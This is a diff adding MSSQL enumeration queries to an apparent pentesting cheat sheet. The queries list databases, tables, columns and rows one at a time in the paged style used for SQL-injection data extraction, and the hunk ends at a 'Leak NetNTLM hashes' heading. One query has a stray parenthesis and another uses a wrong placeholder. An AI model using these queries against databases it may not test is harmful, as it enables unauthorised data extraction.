@@ -60,13 +60,36 @@ Show current DB name:
 ```sql
 SELECT db_name();
 ```
+
+```sql
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
+```
+
 **List tables in selected DB:**
 ---
 #mssql 
+
 ```sql
 SELECT * FROM SYSOBJECTS WHERE xtype = 'U';
 ```
 
+```sql
+SELECT name FROM $DB_NAME..sysobjects WHERE xtype = 'U' order by name offset 1 rows fetch next 1 rows only)
+```
+List columns:
+---
+```sql
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '$COLUMN') order by name offset 1 rows fetch next 1 rows only
+```
+and offset for each entry
+List column:
+---
+```sql
+SELECT top 1 $COLUMN from $TABLE ORDER BY $COLUMN;
+```
+```sql
+SELECT top 1 $COLUMN from $TABLE ORDER BY $COLUMN offset 1 rows fetch next 1 rows only;
+```
 Leak NetNTLM hashes
 ---
 #hash #ntlm #netntlm #responder
